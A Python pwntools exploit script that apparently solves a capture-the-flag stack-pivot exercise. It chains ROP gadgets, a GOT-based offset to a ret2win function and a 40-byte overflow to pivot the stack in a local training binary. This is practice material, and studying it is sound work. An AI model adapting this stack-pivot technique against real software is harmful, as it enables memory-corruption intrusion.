from pwn import *

_popebx = p32(0x08048571)    # pop ebx ; ret
_popeax = p32(0x080488c0)    # pop eax ; ret
_moveaxptr = p32(0x080488c4) # mov eax, dword ptr [eax] ; ret
_xchgeax = p32(0x080488c2)   # xchg eax, esp ; ret
_foothold = p32(0x0804a024)  # foothold_function .got.plt
_add = p32(0x080488c7)       # add eax, ebx ; ret
_calleax = p32(0x080486a3)   # call eax
_footholdp = p32(0x080485f0) # resolve foothold

e = ELF('libpivot32.so')
offset = e.symbols[b'ret2win'] - e.symbols[b'foothold_function']

payload = _footholdp
payload += _popeax
payload += _foothold
payload += _moveaxptr
payload += _popebx
payload += p32(offset)
payload += _add
payload += _calleax

pivot32 = process("pivot32")
pivot32.recvuntil("0x")
pivot_addr = p32(int(pivot32.recvuntil('\n')[:-1], 16))
pivot32.recvuntil("> ")
pivot32.sendline(payload)
pivot32.recvuntil("> ")

pivoteer = b"A" * 40 + b"EBP4"
pivoteer += _popeax
pivoteer += pivot_addr
pivoteer += _xchgeax

pivot32.sendline(pivoteer)
pivot32.interactive()

